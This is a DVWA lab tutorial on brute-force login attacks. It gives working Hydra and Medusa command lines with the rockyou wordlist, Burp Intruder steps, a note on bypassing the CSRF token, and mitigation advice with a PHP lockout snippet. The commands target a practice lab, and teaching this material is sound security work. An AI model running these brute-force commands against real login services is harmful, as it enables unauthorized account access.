Brute Force

🔍 What Is It?

Brute Force is an attack that attempts to gain unauthorized access by systematically trying all possible combinations of usernames and passwords until the correct one is found. Variations include:
Pure Brute Force — try every possible character combination
Dictionary Attack — try common passwords from a wordlist
Credential Stuffing — use leaked username/password pairs from other breaches
Password Spraying — try one common password against many accounts

⚙️ How It Works in DVWA

DVWA's Brute Force module is a simple login form. At the Low security level there is:
No account lockout
No rate limiting
No CAPTCHA
No MFA
This makes it trivially vulnerable to automated attacks.

💥 Exploitation

Manual Test — Confirm Vulnerability
Username: admin
Password: password  → "Welcome to the password protected area admin"
Username: admin
Password: wrong     → "Username and/or password incorrect."
Different error messages confirm username validity (username enumeration).
Using Hydra
Hydra is the most popular tool for HTTP brute force:
bash# GET-based login (DVWA Low)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      dvwa http-get-form \
      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=xxx; security=low"
bash# POST-based login
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      dvwa http-post-form \
      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

      
Using Burp Suite Intruder

Intercept the login request in Burp Suite
Send to Intruder
Mark the password field as the injection point (§password§)
Set attack type to Sniper
Load a wordlist (e.g., rockyou.txt) as payload
Start attack — filter responses by length or status code
The correct password will produce a different response length


Using Medusa

bashmedusa -h dvwa -u admin -P /usr/share/wordlists/rockyou.txt \
       -m HTTP -T 10 \
       -f /vulnerabilities/brute/ \
       -e ns
Medium Security — CSRF Token Bypass
DVWA Medium adds a CSRF token to the form. Tools like Burp Macros or custom scripts can fetch a fresh token before each attempt.


🔐 Mitigation

MethodDescriptionAccount LockoutLock account after N failed attempts (e.g., 5 attempts → 15 min lockout)Rate LimitingSlow down responses after repeated failures from the same IPCAPTCHARequire human verification after failed attemptsMulti-Factor Authentication (MFA)Even with correct credentials, attacker can't log in without second factorStrong Password PolicyEnforce minimum length, complexity, and check against breached password listsGeneric Error MessagesReturn the same error whether username or password is wrong (prevent enumeration)IP-Based BlockingBlock or alert on high-frequency requests from single IPs
php// ✅ Basic rate limiting with session
session_start();
if (!isset($_SESSION['failed_attempts'])) {
    $_SESSION['failed_attempts'] = 0;
    $_SESSION['lockout_time'] = 0;
}

if (time() < $_SESSION['lockout_time']) {
    die("Account temporarily locked. Try again later.");
}

if (login_failed()) {
    $_SESSION['failed_attempts']++;
    if ($_SESSION['failed_attempts'] >= 5) {
        $_SESSION['lockout_time'] = time() + 900; // 15 minutes
    }
}

